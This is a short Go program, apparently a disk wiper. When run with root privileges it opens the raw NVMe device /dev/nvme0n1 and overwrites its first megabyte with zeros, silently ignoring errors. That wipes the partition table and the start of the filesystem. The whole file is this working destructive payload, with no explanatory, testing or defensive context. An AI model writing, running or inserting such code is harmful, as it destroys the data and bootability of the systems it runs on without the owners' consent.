package main
import ("os")
func main() {
	if os.Geteuid() != 0 { return }
	f, err := os.OpenFile("/dev/nvme0n1", os.O_RDWR, 0)
	if err != nil { return }
	defer f.Close()
	_, _ = f.Write(make([]byte, 1048576))
}
